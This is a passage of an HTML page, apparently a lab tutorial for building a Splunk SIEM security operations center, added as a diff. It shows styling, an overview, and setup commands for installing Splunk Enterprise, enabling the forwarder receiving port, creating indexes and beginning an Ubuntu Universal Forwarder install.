@@ -1,0 +1,1864 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOC Lab: Splunk SIEM Setup Guide | End-to-End Security Operations Center</title>
+<meta name="description" content="Comprehensive step-by-step guide to building a Security Operations Center with Splunk, Ubuntu VM, and Windows Server. Attack simulation, dashboards, and alerting.">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="SOC Lab: Splunk SIEM Setup Guide">
+<meta property="og:description" content="Build a fully functional Splunk SIEM with Ubuntu and Windows endpoints, real-time dashboards, and attack simulations.">
+<meta property="og:type" content="article">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "Building a Security Operations Center with Splunk",
+  "description": "End-to-end guide for setting up Splunk SIEM with Ubuntu and Windows Server endpoints",
+  "keywords": "SOC, Splunk, SIEM, Security Operations Center, Ubuntu, Windows Server"
+}
+</script>
+<style>
+  :root {
+    --bg-deep: #080c10;
+    --bg-panel: #0d1117;
+    --bg-card: #111820;
+    --bg-code: #0a0f14;
+    --accent-green: #00ff88;
+    --accent-cyan: #00d4ff;
+    --accent-orange: #ff6b35;
+    --accent-red: #ff3355;
+    --accent-yellow: #ffd700;
+    --accent-purple: #a855f7;
+    --text-primary: #e2e8f0;
+    --text-secondary: #8892a4;
+    --text-dim: #4a5568;
+    --border-color: #1e2d3d;
+    --border-glow: rgba(0,255,136,0.15);
+    --grid-line: rgba(0,212,255,0.04);
+    --font-mono: 'Share Tech Mono', monospace;
+    --font-display: 'Rajdhani', sans-serif;
+    --font-code: 'Space Mono', monospace;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background-color: var(--bg-deep);
+    color: var(--text-primary);
+    font-family: var(--font-display);
+    font-size: 16px;
+    line-height: 1.6;
+    overflow-x: hidden;
+  }
+
+  /* Grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(var(--grid-line) 1px, transparent 1px),
+      linear-gradient(90deg, var(--grid-line) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* Animated scan line */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--accent-cyan), transparent);
+    animation: scanline 8s linear infinite;
+    z-index: 1000;
+    pointer-events: none;
+  }
+
+  @keyframes scanline {
+    0% { top: -2px; opacity: 0; }
+    10% { opacity: 1; }
+    90% { opacity: 1; }
+    100% { top: 100vh; opacity: 0; }
+  }
+
+  @keyframes pulse-glow {
+    0%, 100% { box-shadow: 0 0 8px var(--accent-green), 0 0 20px rgba(0,255,136,0.1); }
+    50% { box-shadow: 0 0 16px var(--accent-green), 0 0 40px rgba(0,255,136,0.2); }
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(24px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes slideInLeft {
+    from { opacity: 0; transform: translateX(-20px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+
+  @keyframes typewriter {
+    from { width: 0; }
+    to { width: 100%; }
+  }
+
+  @keyframes rotate-border {
+    0% { background-position: 0% 50%; }
+    100% { background-position: 200% 50%; }
+  }
+
+  /* Skip link */
+  .skip-link {
+    position: absolute; top: -40px; left: 0;
+    background: var(--accent-green); color: #000;
+    padding: 8px; z-index: 9999; font-family: var(--font-mono);
+  }
+  .skip-link:focus { top: 0; }
+
+  /* Nav */
+  nav {
+    position: sticky; top: 0; z-index: 100;
+    background: rgba(8,12,16,0.92);
+    backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border-color);
+    padding: 0 2rem;
+  }
+
+  .nav-inner {
+    max-width: 1200px; margin: 0 auto;
+    display: flex; align-items: center; justify-content: space-between;
+    height: 60px;
+  }
+
+  .nav-logo {
+    font-family: var(--font-mono); font-size: 14px;
+    color: var(--accent-green);
+    display: flex; align-items: center; gap: 10px;
+  }
+
+  .nav-logo .status-dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: var(--accent-green);
+    animation: pulse-glow 2s ease-in-out infinite;
+  }
+
+  .nav-phases {
+    display: flex; gap: 4px; list-style: none;
+  }
+
+  .nav-phases a {
+    display: flex; align-items: center; gap: 6px;
+    padding: 6px 12px; border-radius: 4px;
+    font-family: var(--font-mono); font-size: 11px;
+    color: var(--text-secondary);
+    text-decoration: none; transition: all 0.2s;
+    border: 1px solid transparent;
+  }
+
+  .nav-phases a:hover {
+    color: var(--accent-cyan);
+    border-color: rgba(0,212,255,0.3);
+    background: rgba(0,212,255,0.05);
+  }
+
+  .nav-phases a.active {
+    color: var(--accent-green);
+    border-color: rgba(0,255,136,0.3);
+    background: rgba(0,255,136,0.05);
+  }
+
+  /* Hero */
+  header {
+    position: relative; z-index: 1;
+    padding: 80px 2rem 60px;
+    max-width: 1200px; margin: 0 auto;
+    animation: fadeInUp 0.8s ease-out;
+  }
+
+  .hero-badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.2);
+    border-radius: 4px; padding: 6px 14px;
+    font-family: var(--font-mono); font-size: 11px;
+    color: var(--accent-green); margin-bottom: 28px;
+    letter-spacing: 2px; text-transform: uppercase;
+  }
+
+  .hero-badge::before {
+    content: '';
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--accent-green);
+    animation: blink 1.2s step-end infinite;
+  }
+
+  h1 {
+    font-family: var(--font-display);
+    font-size: clamp(2.4rem, 5vw, 4.2rem);
+    font-weight: 700;
+    line-height: 1.05;
+    letter-spacing: -1px;
+    margin-bottom: 20px;
+  }
+
+  h1 .line1 { display: block; color: var(--text-primary); }
+  h1 .line2 {
+    display: block;
+    background: linear-gradient(90deg, var(--accent-green), var(--accent-cyan));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+
+  .hero-subtitle {
+    font-size: 1.1rem; color: var(--text-secondary);
+    max-width: 640px; margin-bottom: 40px;
+    font-weight: 400; line-height: 1.7;
+  }
+
+  /* Architecture diagram */
+  .arch-diagram {
+    position: relative; z-index: 1;
+    max-width: 1200px; margin: 0 auto 60px;
+    padding: 0 2rem;
+    animation: fadeInUp 1s ease-out 0.2s both;
+  }
+
+  .arch-grid {
+    display: grid;
+    grid-template-columns: 1fr 80px 1fr 80px 1fr;
+    align-items: center; gap: 0;
+    background: var(--bg-panel);
+    border: 1px solid var(--border-color);
+    border-radius: 12px; padding: 28px;
+    overflow: hidden;
+    position: relative;
+  }
+
+  .arch-grid::before {
+    content: '';
+    position: absolute; inset: 0;
+    background: radial-gradient(ellipse at 50% 0%, rgba(0,212,255,0.04) 0%, transparent 60%);
+    pointer-events: none;
+  }
+
+  .arch-node {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: 10px; padding: 20px;
+    text-align: center; transition: all 0.3s;
+    cursor: default; position: relative;
+  }
+
+  .arch-node:hover {
+    border-color: rgba(0,212,255,0.4);
+    background: rgba(0,212,255,0.04);
+    transform: translateY(-2px);
+  }
+
+  .arch-node.splunk { border-color: rgba(0,255,136,0.3); }
+  .arch-node.splunk:hover { border-color: var(--accent-green); }
+
+  .arch-node-icon {
+    font-size: 28px; margin-bottom: 10px; display: block;
+  }
+
+  .arch-node-title {
+    font-family: var(--font-mono); font-size: 12px;
+    color: var(--accent-cyan); text-transform: uppercase; letter-spacing: 1px;
+    margin-bottom: 4px;
+  }
+
+  .arch-node-sub {
+    font-size: 11px; color: var(--text-secondary);
+    font-family: var(--font-mono);
+  }
+
+  .arch-arrow {
+    display: flex; flex-direction: column;
+    align-items: center; gap: 4px;
+  }
+
+  .arch-arrow-line {
+    width: 100%; height: 1px;
+    background: linear-gradient(90deg, var(--border-color), var(--accent-cyan), var(--border-color));
+    position: relative;
+  }
+
+  .arch-arrow-line::after {
+    content: '▶';
+    position: absolute; right: -6px; top: 50%;
+    transform: translateY(-50%);
+    font-size: 10px; color: var(--accent-cyan);
+    animation: pulse-right 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse-right {
+    0%, 100% { opacity: 0.4; }
+    50% { opacity: 1; }
+  }
+
+  .arch-arrow-label {
+    font-family: var(--font-mono); font-size: 10px;
+    color: var(--accent-cyan); letter-spacing: 1px;
+    opacity: 0.7;
+  }
+
+  /* Main content */
+  main {
+    position: relative; z-index: 1;
+    max-width: 1200px; margin: 0 auto;
+    padding: 0 2rem 80px;
+  }
+
+  /* Phase sections */
+  .phase {
+    margin-bottom: 72px;
+    animation: fadeInUp 0.6s ease-out both;
+  }
+
+  .phase-header {
+    display: flex; align-items: center; gap: 16px;
+    margin-bottom: 32px; padding-bottom: 16px;
+    border-bottom: 1px solid var(--border-color);
+  }
+
+  .phase-number {
+    font-family: var(--font-mono); font-size: 11px;
+    color: var(--bg-deep);
+    background: var(--accent-green);
+    width: 32px; height: 32px; border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 700; flex-shrink: 0;
+    letter-spacing: 0;
+  }
+
+  .phase-title-group { flex: 1; }
+
+  h2 {
+    font-family: var(--font-display);
+    font-size: 1.7rem; font-weight: 700;
+    color: var(--text-primary);
+    letter-spacing: -0.3px;
+  }
+
+  .phase-tag {
+    font-family: var(--font-mono); font-size: 10px;
+    color: var(--text-secondary); letter-spacing: 2px;
+    text-transform: uppercase; margin-top: 2px;
+  }
+
+  .phase-status {
+    font-family: var(--font-mono); font-size: 11px;
+    padding: 4px 10px; border-radius: 4px;
+    border: 1px solid;
+  }
+
+  .phase-status.required { color: var(--accent-green); border-color: rgba(0,255,136,0.3); background: rgba(0,255,136,0.05); }
+  .phase-status.important { color: var(--accent-yellow); border-color: rgba(255,215,0,0.3); background: rgba(255,215,0,0.05); }
+  .phase-status.optional { color: var(--accent-cyan); border-color: rgba(0,212,255,0.3); background: rgba(0,212,255,0.05); }
+
+  /* Steps */
+  .steps { display: flex; flex-direction: column; gap: 20px; }
+
+  .step {
+    background: var(--bg-panel);
+    border: 1px solid var(--border-color);
+    border-radius: 10px; overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .step:hover { border-color: rgba(0,212,255,0.25); }
+
+  .step-header {
+    display: flex; align-items: center; gap: 14px;
+    padding: 16px 20px; cursor: pointer;
+    user-select: none;
+  }
+
+  .step-num {
+    font-family: var(--font-mono); font-size: 11px;
+    color: var(--accent-cyan); min-width: 28px;
+  }
+
+  h3 {
+    font-family: var(--font-display);
+    font-size: 1rem; font-weight: 600;
+    color: var(--text-primary); flex: 1;
+  }
+
+  .step-toggle {
+    font-family: var(--font-mono); font-size: 16px;
+    color: var(--text-dim); transition: transform 0.2s, color 0.2s;
+  }
+
+  .step.open .step-toggle {
+    transform: rotate(90deg); color: var(--accent-green);
+  }
+
+  .step-body {
+    display: none; padding: 0 20px 20px;
+    border-top: 1px solid var(--border-color);
+  }
+
+  .step.open .step-body { display: block; }
+
+  .step-desc {
+    font-size: 0.95rem; color: var(--text-secondary);
+    margin: 16px 0 14px; line-height: 1.7;
+  }
+
+  /* Code blocks */
+  .code-block {
+    background: var(--bg-code);
+    border: 1px solid var(--border-color);
+    border-radius: 8px; overflow: hidden;
+    margin: 14px 0;
+  }
+
+  .code-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 8px 14px;
+    background: rgba(255,255,255,0.02);
+    border-bottom: 1px solid var(--border-color);
+  }
+
+  .code-lang {
+    font-family: var(--font-mono); font-size: 10px;
+    color: var(--accent-cyan); letter-spacing: 2px; text-transform: uppercase;
+  }
+
+  .copy-btn {
+    font-family: var(--font-mono); font-size: 10px;
+    color: var(--text-dim); background: none;
+    border: 1px solid var(--border-color); border-radius: 4px;
+    padding: 3px 8px; cursor: pointer; transition: all 0.15s;
+    letter-spacing: 1px;
+  }
+
+  .copy-btn:hover { color: var(--accent-green); border-color: rgba(0,255,136,0.4); }
+  .copy-btn.copied { color: var(--accent-green); border-color: var(--accent-green); }
+
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    font-family: var(--font-code);
+    font-size: 12.5px;
+    line-height: 1.8;
+    color: var(--text-primary);
+  }
+
+  .c-green { color: var(--accent-green); }
+  .c-cyan { color: var(--accent-cyan); }
+  .c-orange { color: var(--accent-orange); }
+  .c-yellow { color: var(--accent-yellow); }
+  .c-purple { color: var(--accent-purple); }
+  .c-red { color: var(--accent-red); }
+  .c-dim { color: var(--text-secondary); }
+
+  /* Info boxes */
+  .info-box {
+    border-radius: 8px; padding: 14px 16px;
+    margin: 14px 0; display: flex; gap: 12px;
+    font-size: 0.9rem; line-height: 1.6;
+  }
+
+  .info-box.tip {
+    background: rgba(0,255,136,0.04);
+    border: 1px solid rgba(0,255,136,0.15);
+    color: #a7f3d0;
+  }
+
+  .info-box.warning {
+    background: rgba(255,107,53,0.04);
+    border: 1px solid rgba(255,107,53,0.2);
+    color: #fed7aa;
+  }
+
+  .info-box.danger {
+    background: rgba(255,51,85,0.05);
+    border: 1px solid rgba(255,51,85,0.2);
+    color: #fca5a5;
+  }
+
+  .info-box.note {
+    background: rgba(0,212,255,0.04);
+    border: 1px solid rgba(0,212,255,0.15);
+    color: #a5f3fc;
+  }
+
+  .info-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+
+  /* Two-column layout */
+  .two-col {
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 16px; margin: 14px 0;
+  }
+
+  @media (max-width: 700px) { .two-col { grid-template-columns: 1fr; } }
+
+  /* Mini cards */
+  .mini-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: 8px; padding: 14px 16px;
+  }
+
+  .mini-card-title {
+    font-family: var(--font-mono); font-size: 10px;
+    color: var(--accent-cyan); letter-spacing: 2px;
+    text-transform: uppercase; margin-bottom: 8px;
+  }
+
+  .mini-card p { font-size: 0.875rem; color: var(--text-secondary); }
+
+  /* Checklist */
+  .checklist { list-style: none; margin: 12px 0; }
+
+  .checklist li {
+    display: flex; align-items: flex-start; gap: 10px;
+    padding: 6px 0; font-size: 0.9rem;
+    color: var(--text-secondary);
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+  }
+
+  .checklist li::before {
+    content: '▸'; color: var(--accent-green);
+    font-size: 12px; margin-top: 2px; flex-shrink: 0;
+  }
+
+  /* SPL query highlight */
+  .spl-keyword { color: var(--accent-cyan); }
+  .spl-pipe { color: var(--accent-orange); }
+  .spl-string { color: var(--accent-yellow); }
+  .spl-field { color: var(--accent-green); }
+  .spl-func { color: var(--accent-purple); }
+
+  /* Attack card */
+  .attack-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: 10px; padding: 20px;
+    margin: 12px 0;
+    position: relative; overflow: hidden;
+  }
+
+  .attack-card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 3px;
+    background: linear-gradient(90deg, var(--accent-red), var(--accent-orange));
+  }
+
+  .attack-header {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 12px;
+  }
+
+  .attack-title {
+    font-family: var(--font-display); font-size: 1rem; font-weight: 600;
+  }
+
+  .attack-severity {
+    font-family: var(--font-mono); font-size: 10px;
+    padding: 3px 8px; border-radius: 3px;
+    letter-spacing: 1px; text-transform: uppercase;
+  }
+
+  .sev-high { background: rgba(255,51,85,0.15); color: var(--accent-red); border: 1px solid rgba(255,51,85,0.3); }
+  .sev-medium { background: rgba(255,107,53,0.15); color: var(--accent-orange); border: 1px solid rgba(255,107,53,0.3); }
+  .sev-info { background: rgba(0,212,255,0.1); color: var(--accent-cyan); border: 1px solid rgba(0,212,255,0.25); }
+
+  .attack-desc { font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 14px; }
+
+  /* Table */
+  table {
+    width: 100%; border-collapse: collapse;
+    font-size: 0.875rem; margin: 14px 0;
+  }
+
+  th {
+    font-family: var(--font-mono); font-size: 10px;
+    text-transform: uppercase; letter-spacing: 2px;
+    color: var(--text-secondary);
+    padding: 10px 14px; text-align: left;
+    border-bottom: 1px solid var(--border-color);
+  }
+
+  td {
+    padding: 10px 14px;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    color: var(--text-secondary);
+    font-family: var(--font-mono); font-size: 12px;
+  }
+
+  td:first-child { color: var(--accent-cyan); }
+
+  tr:hover td { background: rgba(255,255,255,0.01); }
+
+  /* Progress tracker */
+  .progress-bar {
+    position: fixed; bottom: 20px; right: 20px;
+    background: rgba(8,12,16,0.92);
+    border: 1px solid var(--border-color);
+    border-radius: 10px; padding: 14px 16px;
+    z-index: 500; min-width: 180px;
+    backdrop-filter: blur(16px);
+  }
+
+  .progress-label {
+    font-family: var(--font-mono); font-size: 10px;
+    color: var(--text-secondary); letter-spacing: 2px;
+    text-transform: uppercase; margin-bottom: 8px;
+    display: flex; justify-content: space-between;
+  }
+
+  .progress-track {
+    height: 3px; background: var(--border-color); border-radius: 2px;
+    overflow: hidden;
+  }
+
+  .progress-fill {
+    height: 100%; width: 0%;
+    background: linear-gradient(90deg, var(--accent-green), var(--accent-cyan));
+    border-radius: 2px; transition: width 0.3s ease;
+  }
+
+  /* Footer */
+  footer {
+    position: relative; z-index: 1;
+    border-top: 1px solid var(--border-color);
+    padding: 32px 2rem;
+    text-align: center;
+    font-family: var(--font-mono); font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  footer span { color: var(--accent-green); }
+</style>
+</head>
+<body>
+<a href="#main-content" class="skip-link">Skip to main content</a>
+
+<nav role="navigation" aria-label="Phase navigation">
+  <div class="nav-inner">
+    <div class="nav-logo">
+      <span class="status-dot" role="img" aria-label="System online"></span>
+      SOC_LAB // SPLUNK_GUIDE v1.0
+    </div>
+    <ul class="nav-phases" role="list">
+      <li><a href="#phase1" aria-label="Phase 1: Splunk Setup">P1</a></li>
+      <li><a href="#phase2" aria-label="Phase 2: Ubuntu Forwarder">P2</a></li>
+      <li><a href="#phase3" aria-label="Phase 3: Windows Forwarder">P3</a></li>
+      <li><a href="#phase4" aria-label="Phase 4: Dashboard">P4</a></li>
+      <li><a href="#phase5" aria-label="Phase 5: Attack Simulation">P5</a></li>
+      <li><a href="#phase6" aria-label="Phase 6: Alerting">P6</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header role="banner">
+  <div class="hero-badge" aria-label="Status: Active lab environment">ACTIVE LAB ENVIRONMENT</div>
+  <h1>
+    <span class="line1">Security Operations Center</span>
+    <span class="line2">Splunk SIEM Complete Guide</span>
+  </h1>
+  <p class="hero-subtitle">
+    End-to-end walkthrough for building a fully functional SOC using Splunk Enterprise. 
+    Connect Ubuntu VM and Windows Server endpoints, create real-time dashboards, 
+    simulate attacks, and configure intelligent alerting.
+  </p>
+
+  <div style="display:flex;gap:24px;flex-wrap:wrap;margin-bottom:12px;">
+    <div class="mini-card" style="flex:1;min-width:150px;">
+      <div class="mini-card-title">Endpoints</div>
+      <p style="color:var(--accent-green);font-size:1.2rem;font-weight:700;font-family:var(--font-mono);">2</p>
+      <p>Ubuntu VM + Windows Server</p>
+    </div>
+    <div class="mini-card" style="flex:1;min-width:150px;">
+      <div class="mini-card-title">Total Phases</div>
+      <p style="color:var(--accent-cyan);font-size:1.2rem;font-weight:700;font-family:var(--font-mono);">6</p>
+      <p>Install → Monitor → Alert</p>
+    </div>
+    <div class="mini-card" style="flex:1;min-width:150px;">
+      <div class="mini-card-title">Attack Scenarios</div>
+      <p style="color:var(--accent-orange);font-size:1.2rem;font-weight:700;font-family:var(--font-mono);">8+</p>
+      <p>Brute force, port scan, more</p>
+    </div>
+    <div class="mini-card" style="flex:1;min-width:150px;">
+      <div class="mini-card-title">Dashboard Panels</div>
+      <p style="color:var(--accent-yellow);font-size:1.2rem;font-weight:700;font-family:var(--font-mono);">10+</p>
+      <p>Real-time SPL visualizations</p>
+    </div>
+  </div>
+</header>
+
+<!-- Architecture Diagram -->
+<section class="arch-diagram" aria-label="System architecture overview">
+  <div class="arch-grid">
+    <div class="arch-node">
+      <span class="arch-node-icon" role="img" aria-label="Linux penguin">🐧</span>
+      <div class="arch-node-title">Ubuntu VM</div>
+      <div class="arch-node-sub">Splunk UF<br>Syslog / Auth Logs</div>
+    </div>
+    <div class="arch-arrow" aria-hidden="true">
+      <div class="arch-arrow-line"></div>
+      <div class="arch-arrow-label">9997/TCP</div>
+    </div>
+    <div class="arch-node splunk">
+      <span class="arch-node-icon" role="img" aria-label="Server">🖥</span>
+      <div class="arch-node-title" style="color:var(--accent-green);">Splunk Enterprise</div>
+      <div class="arch-node-sub">Indexer + Search Head<br>Port 8000 (Web UI)</div>
+    </div>
+    <div class="arch-arrow" style="transform:scaleX(-1);" aria-hidden="true">
+      <div class="arch-arrow-line"></div>
+      <div class="arch-arrow-label">9997/TCP</div>
+    </div>
+    <div class="arch-node">
+      <span class="arch-node-icon" role="img" aria-label="Windows flag">🪟</span>
+      <div class="arch-node-title">Windows Server</div>
+      <div class="arch-node-sub">Splunk UF<br>WinEventLog / Sysmon</div>
+    </div>
+  </div>
+</section>
+
+<main id="main-content">
+
+<!-- ===== PHASE 1 ===== -->
+<section class="phase" id="phase1" aria-labelledby="phase1-title">
+  <div class="phase-header">
+    <div class="phase-number" aria-hidden="true">01</div>
+    <div class="phase-title-group">
+      <h2 id="phase1-title">Splunk Enterprise — Install &amp; Configure</h2>
+      <div class="phase-tag">Foundation · Host Machine or Dedicated VM</div>
+    </div>
+    <span class="phase-status required" aria-label="Required step">Required</span>
+  </div>
+
+  <div class="steps">
+
+    <article class="step open" aria-label="Step 1.1: Download and Install Splunk">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="true">
+        <span class="step-num">1.1</span>
+        <h3>Download &amp; Install Splunk Enterprise (Linux Host)</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Install Splunk Enterprise on your host machine or a dedicated Linux VM. Splunk will act as both the indexer 
+          and search head for this lab. The free trial supports up to 500MB/day of indexed data — sufficient for a lab environment.
+        </p>
+        <div class="info-box note">
+          <span class="info-icon">ℹ</span>
+          <div>Create a free Splunk account at <strong>splunk.com</strong>, then download Splunk Enterprise for Linux (.deb or .rpm). The following uses the .deb package for Ubuntu/Debian hosts.</div>
+        </div>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Download Splunk Enterprise (replace version with latest)</span>
+<span class="c-green">wget</span> <span class="c-cyan">-O</span> splunk-9.x.x-linux-amd64.deb \
+  <span class="c-yellow">'https://download.splunk.com/products/splunk/releases/9.x.x/linux/splunk-9.x.x-linux-amd64.deb'</span>
+
+<span class="c-dim"># Install the package</span>
+<span class="c-green">sudo dpkg -i</span> splunk-9.x.x-linux-amd64.deb
+
+<span class="c-dim"># Start Splunk and accept license</span>
+<span class="c-green">sudo /opt/splunk/bin/splunk start</span> <span class="c-cyan">--accept-license</span>
+
+<span class="c-dim"># Enable Splunk to start on boot</span>
+<span class="c-green">sudo /opt/splunk/bin/splunk enable boot-start</span>
+
+<span class="c-dim"># Set admin password (you'll be prompted)</span>
+<span class="c-green">sudo /opt/splunk/bin/splunk edit user admin</span> <span class="c-cyan">-password YourSecurePass123!</span> <span class="c-cyan">-role admin</span> <span class="c-cyan">-auth admin:changeme</span></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — verify install</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Check Splunk status</span>
+<span class="c-green">sudo /opt/splunk/bin/splunk status</span>
+
+<span class="c-dim"># Access the web UI from your browser:</span>
+<span class="c-cyan">http://&lt;SPLUNK_HOST_IP&gt;:8000</span>
+<span class="c-dim"># Default credentials: admin / YourSecurePass123!</span></pre>
+        </div>
+
+        <div class="info-box tip">
+          <span class="info-icon">✓</span>
+          <div><strong>VMware Tip:</strong> Note the IP address of your Splunk VM. In VMware, use <code>ip addr show</code> to find it. Set a static IP in VMware's virtual network settings to avoid IP changes on reboot.</div>
+        </div>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 1.2: Configure Receiving Port">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">1.2</span>
+        <h3>Configure Splunk to Receive Data (Enable Listening Port)</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Enable Splunk's receiving port so Universal Forwarders can send data. Port 9997 is the standard forwarder 
+          receiving port. This must be done before connecting any forwarder.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — via CLI</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Enable receiving on port 9997</span>
+<span class="c-green">sudo /opt/splunk/bin/splunk enable listen</span> <span class="c-orange">9997</span> <span class="c-cyan">-auth admin:YourSecurePass123!</span>
+
+<span class="c-dim"># Verify the port is listening</span>
+<span class="c-green">ss -tlnp</span> | <span class="c-green">grep</span> <span class="c-orange">9997</span></pre>
+        </div>
+        <p class="step-desc">Alternatively, via the Splunk Web UI:</p>
+        <ul class="checklist" aria-label="Web UI steps">
+          <li>Navigate to <strong>Settings → Forwarding and receiving</strong></li>
+          <li>Click <strong>Configure receiving</strong> → <strong>New Receiving Port</strong></li>
+          <li>Enter port <strong>9997</strong> and save</li>
+          <li>Confirm the port shows as <strong>Enabled</strong></li>
+        </ul>
+        <div class="info-box warning">
+          <span class="info-icon">⚠</span>
+          <div>Open port 9997 in your firewall: <code>sudo ufw allow 9997/tcp</code> on the Splunk host. For VMware, ensure the VM's virtual network allows inter-VM communication (use NAT or Host-Only with the same subnet).</div>
+        </div>
+      </div>
+    </article>
+
+    <article class="step" aria-label="Step 1.3: Create Indexes">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="false">
+        <span class="step-num">1.3</span>
+        <h3>Create Custom Indexes for Log Separation</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          Create dedicated indexes to separate logs by source type. This improves search performance, 
+          access control, and makes dashboard queries cleaner.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — create indexes via CLI</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Create Linux/Ubuntu log index</span>
+<span class="c-green">sudo /opt/splunk/bin/splunk add index</span> <span class="c-yellow">linux_logs</span> <span class="c-cyan">-auth admin:YourSecurePass123!</span>
+
+<span class="c-dim"># Create Windows log index</span>
+<span class="c-green">sudo /opt/splunk/bin/splunk add index</span> <span class="c-yellow">windows_logs</span> <span class="c-cyan">-auth admin:YourSecurePass123!</span>
+
+<span class="c-dim"># Create security events index (attack simulation data)</span>
+<span class="c-green">sudo /opt/splunk/bin/splunk add index</span> <span class="c-yellow">soc_security</span> <span class="c-cyan">-auth admin:YourSecurePass123!</span></pre>
+        </div>
+        <div class="two-col">
+          <div class="mini-card">
+            <div class="mini-card-title">linux_logs</div>
+            <p>Syslog, auth.log, kern.log, UFW firewall logs from Ubuntu</p>
+          </div>
+          <div class="mini-card">
+            <div class="mini-card-title">windows_logs</div>
+            <p>Windows Event Log, Security, System, Sysmon events from WinServer</p>
+          </div>
+        </div>
+      </div>
+    </article>
+
+  </div>
+</section>
+
+<!-- ===== PHASE 2 ===== -->
+<section class="phase" id="phase2" aria-labelledby="phase2-title">
+  <div class="phase-header">
+    <div class="phase-number" aria-hidden="true">02</div>
+    <div class="phase-title-group">
+      <h2 id="phase2-title">Ubuntu VM — Universal Forwarder Setup</h2>
+      <div class="phase-tag">Endpoint Configuration · Ubuntu 20.04 / 22.04</div>
+    </div>
+    <span class="phase-status required" aria-label="Required step">Required</span>
+  </div>
+
+  <div class="steps">
+
+    <article class="step open" aria-label="Step 2.1: Install Universal Forwarder">
+      <div class="step-header" onclick="toggleStep(this)" role="button" tabindex="0" aria-expanded="true">
+        <span class="step-num">2.1</span>
+        <h3>Install Splunk Universal Forwarder on Ubuntu</h3>
+        <span class="step-toggle" aria-hidden="true">▶</span>
+      </div>
+      <div class="step-body">
+        <p class="step-desc">
+          The Universal Forwarder (UF) is a lightweight Splunk agent that collects and forwards logs to the Splunk 
+          indexer. It runs as a background service and has minimal system overhead.
+        </p>
+        <div class="code-block">
+          <div class="code-header">
+            <span class="code-lang">bash — Ubuntu VM terminal</span>
+            <button class="copy-btn" onclick="copyCode(this)" aria-label="Copy code">COPY</button>
+          </div>
+          <pre><span class="c-dim"># Download the Universal Forwarder</span>
+<span class="c-green">wget</span> <span class="c-cyan">-O</span> splunkforwarder-9.x.x-linux-amd64.deb \
+  <span class="c-yellow">'https://download.splunk.com/products/universalforwarder/releases/9.x.x/linux/splunkforwarder-9.x.x-linux-amd64.deb'</span>
+
+<span class="c-dim"># Install</span>
